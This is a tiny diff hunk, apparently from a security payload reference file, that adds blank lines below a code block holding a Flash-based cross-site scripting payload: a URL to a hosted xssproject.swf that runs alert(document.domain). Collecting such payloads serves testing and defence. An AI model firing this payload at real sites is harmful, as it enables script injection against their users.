@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:21:40.578602+00:00'
 ```bash
 http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
 ```
+
+
